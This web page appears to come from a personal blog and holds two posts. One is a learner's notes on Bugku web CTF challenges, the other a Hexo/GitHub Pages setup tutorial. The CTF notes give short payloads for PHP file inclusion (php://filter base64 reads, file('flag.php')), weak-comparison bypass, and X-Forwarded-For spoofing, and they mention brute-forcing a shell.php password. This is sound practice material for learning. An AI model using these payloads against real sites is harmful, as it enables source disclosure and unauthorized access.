<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://fallsilkworms.github.io/2021/01/25/bugku%E5%88%B7%E9%A2%98%E4%BD%93%E4%BC%9A/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="YX">
      <meta itemprop="description" content="等一场秋风再起，花开如绎">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fallsilkworm's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/01/25/bugku%E5%88%B7%E9%A2%98%E4%BD%93%E4%BC%9A/" class="post-title-link" itemprop="url">bugku刷题体会</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-25 22:31:06" itemprop="dateCreated datePublished" datetime="2021-01-25T22:31:06+08:00">2021-01-25</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2021-11-05 14:37:21" itemprop="dateModified" datetime="2021-11-05T14:37:21+08:00">2021-11-05</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>参考来源：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/5fd1b624fd7a">https://www.jianshu.com/p/5fd1b624fd7a</a></p>
<p>基本操作：看源码，发送http请求，bp抓包，bp爆破，bp伪造cookie，目前遇到的就是这些。重要的是读懂代码和题目意思。一般打开一道题基本都离不开看源码抓包改包，然后才就用各种web工具。所以f12和bp是打开的基本姿势。</p>
<h2 id="（1）看源码"><a href="#（1）看源码" class="headerlink" title="（1）看源码"></a>（1）看源码</h2><p><u><strong>考点：所学知识的集合。</strong></u></p>
<p>   最简单的类型，直接查看网页源码得知很多信息，可以在直接修改网页东西（web2）新手基本只能自己做的就是这种题型。基本上都包含其他的知识点一起出题，能直接得到flag的极少。需要具备的能力是看懂各种加密后的代码。</p>
<p>例子：</p>
<p>web1：直接查看。</p>
<p>web2：查看后修改限制值。</p>
<p>web6：查看后Unicode解码。</p>
<p>web13：查看后发现下面断开的代码，合上后用url解码</p>
<h2 id="（2）发送http请求"><a href="#（2）发送http请求" class="headerlink" title="（2）发送http请求"></a>（2）发送http请求</h2><p><u><strong>考点：get/post传参，php函数，php弱比较，文件包含漏洞等</strong></u></p>
<p>  是相对很难的题型，需要具备的能力是基本认识url，html，php，JavaScript，python等多种语言，读懂代码后才能做题。现在是刚接触，未了解到这些语言各种的应用，做起来很吃力很懵逼。而且有非常多的题目都是这种题型。</p>
<p>例子：</p>
<p>web3：get传参。读代码后知道，**<u>?what=flag</u>**</p>
<p>web4：post传参。使用hackbar直接传参。</p>
<p>web5：php弱比较。读代码后，由“if($num==1)”知道了这是php弱比较，逻辑矛盾即可。所以用%00截断， <strong><u>?num=1%00</u></strong>     其实后面跟一个不是数字的也得。</p>
<p>web8：文件包含。读代码。发现var_dump()，file()函数，还有include，属于php包含。</p>
<p><img src="/2021/01/25/bugku%E5%88%B7%E9%A2%98%E4%BD%93%E4%BC%9A/image-20210125212546874.png" alt="image-20210125212546874"></p>
<p><img src="/2021/01/25/bugku%E5%88%B7%E9%A2%98%E4%BD%93%E4%BC%9A/image-20210125212916480.png" alt="image-20210125212916480"></p>
<p><img src="/2021/01/25/bugku%E5%88%B7%E9%A2%98%E4%BD%93%E4%BC%9A/image-20210125211944681.png" alt="image-20210125211944681"></p>
<p>由于不会直接看题解</p>
<p><img src="/2021/01/25/bugku%E5%88%B7%E9%A2%98%E4%BD%93%E4%BC%9A/image-20210120010319644.png" alt="image-20210120010319644"></p>
<p>request直接可以用get传参 <strong>?hello=file(‘flag.php’)</strong> .</p>
<p>web9：刚刚来以为类似web8，所以我用web8的方法直接传参失败了，其实也是新的东西。查看题解。</p>
<p><img src="/2021/01/25/bugku%E5%88%B7%E9%A2%98%E4%BD%93%E4%BC%9A/image-20210125213400738.png" alt="image-20210125213400738"></p>
<p>思路就是，把单个变量变成全局变量调用就看见了。</p>
<p><img src="/2021/01/25/bugku%E5%88%B7%E9%A2%98%E4%BD%93%E4%BC%9A/image-20210125213832278.png" alt="image-20210125213832278"></p>
<p>web14：看源码抓包啥也没有，直接看题解说用到php://filter读取文件后直接构造payload。**?file=php://filter/read=convert.base64-encode/resource=index.php**</p>
<p><img src="/2021/01/25/bugku%E5%88%B7%E9%A2%98%E4%BD%93%E4%BC%9A/image-20210125215900875.png" alt="image-20210125215900875"></p>
<p><img src="/2021/01/25/bugku%E5%88%B7%E9%A2%98%E4%BD%93%E4%BC%9A/image-20210125220019199.png" alt="image-20210125220019199"></p>
<h2 id="（3）用工具"><a href="#（3）用工具" class="headerlink" title="（3）用工具"></a>（3）用工具</h2><p>web7：抓包，不断发送请求，就能看到了。</p>
<p>web10：抓包，发送后直接查看响应头有flag（真·头等舱）</p>
<p>web11：抓包没东西，直接看题解说用御剑后台扫描，扫出一个shell.php</p>
<p>直接打开发现是需要密码，用bp抓包爆破。密码是hack（不晓得为什么我爆不出来，今后再尝试）</p>
<p>web12：看源码找到一串bas64，解码得test123觉得就是密码，根据题目猜用户名是admin，但是这一步完了登不上去，ip禁止访问。然后看题解得知要用bp伪造ip !</p>
<p>XFF（X-Forwarded-For）改一下,一弄就看见flag了。</p>
<p><img src="/2021/01/25/bugku%E5%88%B7%E9%A2%98%E4%BD%93%E4%BC%9A/image-20210125215318443.png" alt="image-20210125215318443"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://fallsilkworms.github.io/2021/01/05/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%8D%9A%E5%AE%A2%E4%BD%93%E9%AA%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="YX">
      <meta itemprop="description" content="等一场秋风再起，花开如绎">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fallsilkworm's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/01/05/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%8D%9A%E5%AE%A2%E4%BD%93%E9%AA%8C/" class="post-title-link" itemprop="url">我的第一次博客体验</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-05 05:29:24" itemprop="dateCreated datePublished" datetime="2021-01-05T05:29:24+08:00">2021-01-05</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2021-01-10 15:38:26" itemprop="dateModified" datetime="2021-01-10T15:38:26+08:00">2021-01-10</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><h3 id="参考文献：https-segmentfault-com-a-1190000016712646"><a href="#参考文献：https-segmentfault-com-a-1190000016712646" class="headerlink" title="参考文献：https://segmentfault.com/a/1190000016712646"></a>参考文献：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000016712646">https://segmentfault.com/a/1190000016712646</a></h3><p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000017986794">https://segmentfault.com/a/1190000017986794</a></p>
<p>钉钉群b站视频</p>
<h2 id="1-准备"><a href="#1-准备" class="headerlink" title="1 准备"></a>1 准备</h2><p>安装环境</p>
<p>注册GitHub账号，安装node，git。</p>
<h2 id="2-搭建仓库"><a href="#2-搭建仓库" class="headerlink" title="2 搭建仓库"></a>2 搭建仓库</h2><p>GitHub里找到新建库 库名为<code>username.github.io</code></p>
<p>可以点进确定的网址测试看看自己的网站是否成功创建 。</p>
<h2 id="3-配置SSH-key"><a href="#3-配置SSH-key" class="headerlink" title="3 配置SSH key"></a>3 配置SSH key</h2><p>使用ssh key来解决本地和服务器的连接问题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd ~&#x2F;. ssh #检查本机已存在的ssh密钥</span><br><span class="line">ssh-keygen -t rsa -C &quot;邮件地址&quot;</span><br></pre></td></tr></table></figure>
<p>然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到<code>.ssh\id_rsa.pub</code>文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：</p>
<p>将刚复制的内容粘贴到key那里。</p>
<h3 id="3-1-测试"><a href="#3-1-测试" class="headerlink" title="3.1 测试"></a>3.1 测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -T git@github.com # 注意邮箱地址不用改</span><br></pre></td></tr></table></figure>
<p>如果提示<code>Are you sure you want to continue connecting (yes/no)?</code>，输入yes，然后会看到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hi C0ldSt0ne! You&#39;ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure>
<p>看到这个信息说明SSH已配置成功！</p>
<h2 id="4-使用hexo写blog"><a href="#4-使用hexo写blog" class="headerlink" title="4 使用hexo写blog"></a>4 使用hexo写blog</h2><p>使用git bash来执行相关hexo命令。</p>
<h3 id="4-1-安装"><a href="#4-1-安装" class="headerlink" title="4.1 安装"></a>4.1 安装</h3><p>在命令行直接安装，输入代码即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g hexo</span><br></pre></td></tr></table></figure>
<p>创建博客根目录，我的是<code>C:\users\godti\myBlog</code></p>
<p>（错了的话随时干掉这个根目录重创就行了）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd &#x2F;c&#x2F;users&#x2F;godti&#x2F;myBlog&#x2F;</span><br><span class="line">$ hexo init</span><br></pre></td></tr></table></figure>
<p>hexo会自动下载一些文件到这个目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g # 生成</span><br><span class="line">$ hexo s # 启动服务</span><br></pre></td></tr></table></figure>
<p>执行以上命令之后，hexo就会在public文件夹生成相关文件</p>
<p><code>hexo s</code>是开启本地预览服务，打开浏览器访问 <a target="_blank" rel="noopener" href="http://localhost:4000/">http://localhost:4000</a> 即可看到内容</p>
<h3 id="4-2-配置-config-yml"><a href="#4-2-配置-config-yml" class="headerlink" title="4.2 配置_config.yml"></a>4.2 配置_config.yml</h3><p>先安装一个插件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
<p>配置<code>_config.yml</code>中有关deploy的部分：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">type: git</span><br></pre></td></tr></table></figure>
<p><code>repo:</code> 就是自己GitHub仓库的网址，防止打错直接复制。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">branch: master</span><br></pre></td></tr></table></figure>
<p>(冒号后面都要有空格否则失败)</p>
<h2 id="4-3-写博客"><a href="#4-3-写博客" class="headerlink" title="4.3 写博客"></a>4.3 写博客</h2><p>定位到hexo根目录 执行命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd myBlog</span><br><span class="line">hexo new &#39;标题&#39;</span><br></pre></td></tr></table></figure>
<p>hexo会帮我们在<code>_posts</code>下生成相关md文件</p>
<p>我们只需要打开这个文件就可以开始写博客了</p>
<p>可以用typora ，很香。</p>
<p>写好之后 <code>hexo g</code>生成博客。</p>
<h2 id="4-4-上传"><a href="#4-4-上传" class="headerlink" title="4.4 上传"></a>4.4 上传</h2><p><code>hexo d</code>直接搞定上传</p>
<p>查看就直接登录自己的GitHub仓库的网址就可以直接查看到自己的博客，不需要在<code>hexo s</code>打开localhost：4000访问。</p>
<h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p>emmm第一次感觉写博客如此复杂。参照了b站视频以及文本教程安装了hexo及其环境，就是需要安装node和git，然后才能完好地安装hexo。随后就是可以把它推到GitHub上了，以后直接访问GitHub就可以查看自己的文章了。总的来说，一切操作跟视频和文本教程走很轻松就完成，今后还要熟练地查文章和写自己的博客。</p>
<h3 id><a href="#" class="headerlink" title></a></h3>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>






<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">YX</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
